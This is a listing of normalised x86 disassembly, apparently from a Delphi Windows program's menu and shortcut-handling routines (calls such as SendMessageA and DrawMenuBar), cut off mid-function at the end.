mov [ eax + 0x8 ] sub_45f848
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4034a4
mov edx ebx
mov eax edi
call sub_421018
mov eax ebx
mov si 0xffee
call sub_4034a4
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45f624
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ esi + 0x4c ] eax
sub_45f658
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45f130
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45f140
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45f698
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45f4c8
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45f4ac
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45f4ac
sub_45f6fc
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45efc0
sub_45f728
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45ef98
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45f008
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45f05c
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_40408c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45f188
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45f0d4
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45f164
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45f178
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45f848
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45f118
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4034a4
sub_45f86c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f88c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f8ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f8cc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f8ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f90c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f92c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f94c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f96c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f98c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419008
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_459630
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_459818
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_459878
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_4594c8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_459938
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45fa04
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421264
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45f118
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45f5b4
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45fa58
jmp r-xdata
xor edx edx
mov eax esi
call sub_45d51c
sub_45fa58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_45aef0
mov eax ebx
call sub_45fac8
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_45af34
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_421018
sub_45faa0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45faa0
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45cbf0
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45f534
mov eax ebx
pop esi
pop ebx
retn
sub_45fadc
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c6b4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404598
sub_45fb0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4040d0
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45fb90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45fcb2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4042f8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4042f8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404558
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404444
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fcb9
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4045e0
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4043b8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4042f8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404558
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4043b8
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45fcf0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_46018f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4040d0
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_460150
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45f130
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4040d0
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460196
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_40405c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_40405c
lea eax [ ebp - 0x18 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
call sub_460344
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45f140
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404444
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45fb0c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45f140
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f140
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a8
mov eax [ ebp - 0x20 ]
call sub_4032a8
mov eax [ ebp - 0x14 ]
call sub_4032a8
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45fb0c
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4042f8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45f140
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_461be8
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407f2c
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_40408c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6b4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c6b4
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45f140
push eax
mov edx esi
mov eax ebx
call sub_45f140
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404558
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407f2c
push ebp
mov eax [ ebp - 0x2c ]
call sub_45fadc
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45fadc
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6b4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4040d0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f140
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45f140
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_461b54
mov edx [ ebp - 0x40 ]
pop eax
call sub_40408c
mov edx esi
mov eax ebx
call sub_45f140
push eax
mov edx esi
mov eax ebx
call sub_45f140
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404558
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45fb90
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404598
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4045e0
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45fb90
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_4601ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45f130
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45f130
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_460370
test al al
je r-xdata
mov eax esi
call sub_45f130
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45f140
call sub_4601c8
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45f140
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45f140
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45f140
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45f140
call sub_4601c8
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45f140
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45f140
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45f140
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45f140
call sub_4601c8
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_460344
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_460344
and eax 0x7f
mov al [ eax + rw-data ]
sub_460370
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_460370
and eax 0x7f
mov al [ eax + rw-data ]
sub_46039c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d084
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_420f48
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_4610c8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_460438
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4032a8
mov eax [ esi + 0x44 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4604ac
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4604ac
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45cbf0
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45f534
mov eax ebx
pop esi
pop ebx
retn
sub_4604ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45f130
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45f140
call sub_4604ec
pop ecx
test al al
je r-xdata
sub_460584
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4604ec
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45cbf0
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4605b4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_460584
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_4618d8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_460624
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_460584
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_460640
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_460584
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45fcf0
mov ebx eax
xor edx edx
mov eax edi
call sub_4601ec
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45f658
mov eax [ esi + 0x34 ]
call sub_45f658
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_45d594
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4530b8
push eax
call DrawMenuBar
sub_46072c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
